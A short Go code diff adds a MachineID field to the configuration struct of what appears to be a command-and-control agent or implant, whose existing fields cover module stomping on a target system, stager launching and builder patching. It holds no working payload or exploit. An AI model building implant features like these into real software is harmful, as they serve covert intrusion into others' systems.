@@ -69,6 +69,8 @@ type Config struct {
 	// Module Stomping
 	ModulePath    string `cbor:"58,keyasint"` // Path to the module to stomp (overwrite) on the target system
 	IsRunByStager bool   `cbor:"59,keyasint"` // Whether the agent is run by a stager
+
+	MachineID string `cbor:"60,keyasint"` // machine ID
 }
 
 // This will be patched by the builder
